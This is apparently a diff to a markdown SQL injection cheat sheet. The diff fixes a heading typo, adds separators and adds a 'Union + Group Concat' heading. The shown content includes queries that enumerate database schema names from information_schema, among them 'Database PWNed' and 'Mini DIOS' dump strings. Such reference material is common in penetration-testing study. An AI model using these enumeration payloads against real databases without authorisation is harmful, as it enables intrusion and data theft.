@@ -1,12 +1,14 @@
 # SQLi: schema, schemata & DIOS
 
-## `schema name` fron `information schema`
+## `schema name` from `information schema`
 
 ### Query basic
 
 ````sql
 select schema_name from information_schema.schemata;
 ````
+
+---
 
 ### Group Concat
 
@@ -26,6 +28,8 @@ SELECT GROUP_CONCAT(schema_name SEPARATOR ' : ') FROM information_schema.schemat
 SELECT GROUP_CONCAT('Database PWNed: ',schema_name) FROM information_schema.schemata;
 ````
 
+---
+
 ### Concat
 
 #### Basic
@@ -43,3 +47,7 @@ SELECT concat(schema_name, ' : ') FROM information_schema.schemata;
 ## Mini DIOS: DB Enum (schema enum)
 SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemata;
 ````
+
+---
+
+### Union + Group Concat
